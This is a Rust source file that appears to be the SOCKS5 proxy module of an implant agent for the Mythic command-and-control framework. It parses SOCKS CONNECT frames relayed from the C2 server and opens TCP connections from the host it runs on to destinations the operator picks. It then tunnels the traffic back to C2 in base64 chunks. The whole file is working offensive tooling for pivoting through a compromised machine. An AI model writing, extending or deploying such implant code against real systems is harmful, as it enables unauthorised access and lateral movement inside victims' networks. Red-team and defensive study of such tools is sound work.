use base64::{decode, encode};
use serde::Deserialize;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::mpsc;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::{mpsc as tokio_mpsc, Mutex as AsyncMutex};
use tokio::time::{timeout, Duration};
use tokio_util::sync::CancellationToken;
use once_cell::sync::Lazy;

#[derive(Deserialize)]
struct AgentTask {
    id: String,
    #[serde(default)]
    command: Option<String>,
    #[serde(default)]
    parameters: Option<String>,
}

// Global state
static SOCKS_OUT: Lazy<Arc<std::sync::Mutex<Vec<Value>>>> = Lazy::new(|| Arc::new(std::sync::Mutex::new(Vec::new())));
static SOCKS_CANCEL: Lazy<CancellationToken> = Lazy::new(CancellationToken::new);

// SOCKS utils
fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
    let mut out = vec![0x05, rep, 0x00];
    match bound {
        Some(SocketAddr::V4(v4)) => {
            out.push(0x01);
            out.extend_from_slice(&v4.ip().octets());
            out.extend_from_slice(&v4.port().to_be_bytes());
        }
        Some(SocketAddr::V6(v6)) => {
            out.push(0x04);
            out.extend_from_slice(&v6.ip().octets());
            out.extend_from_slice(&v6.port().to_be_bytes());
        }
        None => {
            out.push(0x01);
            out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
            out.extend_from_slice(&0u16.to_be_bytes());
        }
    }
    out
}

fn send_socks_live(server_id: &str, data: &[u8], exit: bool) -> Result<(), Box<dyn Error>> {
    let sid_json = match server_id.parse::<u64>() {
        Ok(n) => json!(n),
        Err(_) => json!(server_id),
    };
    let item = json!({
        "server_id": sid_json,
        "data": encode(data),
        "exit": exit
    });
    let mut out = SOCKS_OUT.lock().unwrap();
    out.push(item);
    Ok(())
}

fn send_exit_live(server_id: &str) {
    let _ = send_socks_live(server_id, &[], true);
}

// CONNECT frame parsing
fn parse_connect(decoded: &[u8]) -> Result<(String, u16, u8), Box<dyn Error>> {
    if decoded.len() < 4 { return Err("SOCKS5 request too short".into()); }
    if decoded[0] != 0x05 { return Err("Unsupported SOCKS version".into()); }
    if decoded[1] != 0x01 { return Err("Not CONNECT (CMD!=0x01)".into()); }
    if decoded[2] != 0x00 { return Err("RSV must be 0x00".into()); }

    let atyp = decoded[3];
    match atyp {
        0x01 => {
            if decoded.len() < 10 { return Err("IPv4 CONNECT frame too short".into()); }
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            Ok((ip.to_string(), port, atyp))
        }
        0x03 => {
            if decoded.len() < 5 { return Err("DOMAIN CONNECT no length".into()); }
            let len = decoded[4] as usize;
            if len == 0 || len > 255 { return Err("Bad domain length".into()); }
            let need = 5 + len + 2;
            if decoded.len() < need { return Err("DOMAIN CONNECT truncated".into()); }
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([decoded[5 + len], decoded[5 + len + 1]]);
            Ok((domain, port, atyp))
        }
        0x04 => {
            if decoded.len() < 22 { return Err("IPv6 CONNECT frame too short".into()); }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&decoded[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([decoded[20], decoded[21]]);
            Ok((ip.to_string(), port, atyp))
        }
        _ => Err("Unsupported ATYP in CONNECT".into()),
    }
}

// Helpers for inbound frames
fn as_string_or_number(v: &Value) -> Option<String> {
    if let Some(s) = v.as_str() { return Some(s.to_string()); }
    if let Some(n) = v.as_u64() { return Some(n.to_string()); }
    if let Some(n) = v.as_i64() { return Some(n.to_string()); }
    None
}

fn normalize_socks_item(v: &Value) -> Option<Value> {
    let sid = v.get("server_id").and_then(as_string_or_number)?;
    let data = v.get("data")
        .or_else(|| v.get("chunk_data"))
        .and_then(|x| x.as_str())
        .unwrap_or("")
        .to_string();
    let exit = v.get("exit")
        .or_else(|| v.get("close"))
        .and_then(|x| x.as_bool())
        .unwrap_or(false);

    Some(json!({ "server_id": sid, "data": data, "exit": exit }))
}

// Greeting detection
fn looks_like_greeting(buf: &[u8]) -> bool {
    if buf.len() < 2 { return false; }
    if buf[0] != 0x05 { return false; }
    let n = buf[1] as usize;
    buf.len() >= 2 + n && buf.len() < 2 + n + 4
}

// Session logic
async fn run_session(
    parent_task_id: String,
    server_id: String,
    mut sess_rx: tokio_mpsc::UnboundedReceiver<Value>,
) -> Result<(), Box<dyn Error>> {
    // Get first frame
    let first = match sess_rx.recv().await {
        Some(v) => v,
        None => return Ok(()),
    };

    let b64 = first["data"].as_str().unwrap_or("");
    let mut buf = match decode(b64) {
        Ok(d) => d,
        Err(e) => {
            send_socks_live(&server_id, &build_reply(0x01, None), true)?;
            return Ok(());
        }
    };

    // Handle optional greeting
    if looks_like_greeting(&buf) {
        let sel = [0x05u8, 0x00u8]; // VER=5, METHOD=0 (no auth)
        send_socks_live(&server_id, &sel, false)?;

        // Wait for CONNECT
        let nxt = match sess_rx.recv().await {
            Some(v) => v,
            None => return Ok(()),
        };
        let b64 = nxt["data"].as_str().unwrap_or("");
        buf = match decode(b64) {
            Ok(d) => d,
            Err(e) => {
                send_socks_live(&server_id, &build_reply(0x01, None), true)?;
                return Ok(());
            }
        };
    }

    // Parse CONNECT
    let (addr, port, _atyp) = match parse_connect(&buf) {
        Ok(v) => v,
        Err(e) => {
            let rep = if e.to_string().contains("ATYP") { 0x08 } else { 0x07 };
            send_socks_live(&server_id, &build_reply(rep, None), true)?;
            return Ok(());
        }
    };

    // Connect to destination
    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            let rep = if e.to_string().to_lowercase().contains("refused") { 0x05 }
                      else if e.to_string().to_lowercase().contains("unreachable") { 0x03 }
                      else if e.to_string().to_lowercase().contains("unsupported") { 0x08 }
                      else { 0x01 };
            send_socks_live(&server_id, &build_reply(rep, None), true)?;
            return Ok(());
        }
        Err(_) => {
            send_socks_live(&server_id, &build_reply(0x01, None), true)?;
            return Ok(());
        }
    };

    let local_addr = remote.local_addr().ok();
    let ok_reply = build_reply(0x00, local_addr);
    send_socks_live(&server_id, &ok_reply, false)?;

    let (mut r_r, mut r_w) = remote.into_split();

    // A2M: Agent to Mythic (remote read -> send to mythic)
    let sid_up = server_id.clone();
    let a2m = tokio::spawn(async move {
        let mut buf = vec![0u8; 16 * 1024];
        loop {
            let result = timeout(Duration::from_secs(300), r_r.read(&mut buf)).await;
            match result {
                Ok(Ok(0)) => {
                    send_exit_live(&sid_up);
                    break;
                }
                Ok(Ok(n)) => {
                    if n > 0 {
                        let _ = send_socks_live(&sid_up, &buf[..n], false);
                    }
                }
                Ok(Err(_)) => {
                    send_exit_live(&sid_up);
                    break;
                }
                Err(_) => {
                    send_exit_live(&sid_up);
                    break;
                }
            }
        }
    });

    // M2A: Mythic to Agent (recv from mythic -> write to remote)
    let sid_dn = server_id.clone();
    let m2a = tokio::spawn(async move {
        while let Some(pkt) = sess_rx.recv().await {
            let exit = pkt.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
            if exit {
                let _ = r_w.shutdown().await;
                break;
            }
            let data_b64 = pkt.get("data").and_then(|v| v.as_str()).unwrap_or("");
            let bytes = match decode(data_b64) {
                Ok(b) => b,
                Err(_) => continue,
            };
            if !bytes.is_empty() {
                let write_result = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await;
                if let Err(_) = write_result {
                    break;
                }
            }
        }
        let _ = r_w.shutdown().await;
    });

    let _ = a2m.await;
    let _ = m2a.await;

    Ok(())
}

// Dispatcher
pub fn start_socks_dispatcher(task_id: String, rx: mpsc::Receiver<Value>) {
    let rt = tokio::runtime::Runtime::new().unwrap();
    rt.block_on(async {
        let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
        let mut seen: u64 = 0;

        // Create channel for SOCKS_IN
        let (socks_tx, mut socks_rx) = tokio_mpsc::unbounded_channel::<Value>();

        // Spawn thread to forward from mpsc to tokio mpsc
        std::thread::spawn(move || {
            while let Ok(item) = rx.recv() {
                if socks_tx.send(item).is_err() {
                    break;
                }
            }
        });

        loop {
            tokio::select! {
                maybe = socks_rx.recv() => {
                    let Some(item) = maybe else {
                        break;
                    };

                    seen += 1;
                    let sid = item["server_id"].as_str().unwrap_or("").to_string();
                    let exit = item["exit"].as_bool().unwrap_or(false);
                    let data_len_b64 = item["data"].as_str().map(|s| s.len()).unwrap_or(0);

                    let entry = sessions.entry(sid.clone()).or_insert_with(|| {
                        let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel::<Value>();
                        let task_clone = task_id.clone();
                        let sid_clone = sid.clone();
                        tokio::spawn(async move {
                            let _ = run_session(task_clone, sid_clone, sess_rx).await;
                        });
                        sess_tx
                    });

                    if entry.send(item).is_err() {
                        sessions.remove(&sid);
                    }

                    if exit {
                        sessions.remove(&sid);
                    }
                }
                _ = SOCKS_CANCEL.cancelled() => {
                    break;
                }
            }
        }
        sessions.clear();
    });
}

// Entry point
pub fn handle_socks(rx: mpsc::Receiver<Value>) -> Result<(), Box<dyn Error>> {
    // First message should be the AgentTask envelope (blocking)
    let task_val = rx.recv()?;
    let task: AgentTask = serde_json::from_value(task_val)?;

    // Parse parameters (JSON string)
    let params: Value = if let Some(p) = task.parameters {
        serde_json::from_str(&p)?
    } else {
        return Err("No parameters in task".into());
    };
    let action = params.get("action").and_then(|v| v.as_str()).unwrap_or("start");

    if action == "stop" {
        SOCKS_CANCEL.cancel();
        return Ok(());
    }

    // Start the dispatcher for "start"
    start_socks_dispatcher(task.id, rx);

    Ok(())
}

pub fn setup_socks(
    _tx: &mpsc::Sender<Value>,
    rx: mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    handle_socks(rx)
}

// Add this function to periodically send SOCKS data to Mythic
pub fn get_socks_data() -> Vec<Value> {
    let mut out = SOCKS_OUT.lock().unwrap();
    out.drain(..).collect()
}
